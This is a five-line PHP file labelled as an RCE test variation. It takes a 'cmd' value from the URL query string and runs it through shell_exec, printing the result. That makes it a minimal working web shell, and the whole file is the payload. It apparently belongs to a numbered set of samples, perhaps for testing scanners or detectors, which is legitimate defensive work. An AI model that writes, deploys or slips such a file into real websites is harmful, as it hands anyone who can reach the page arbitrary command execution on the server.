<?php
// RCE test variation #1302
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>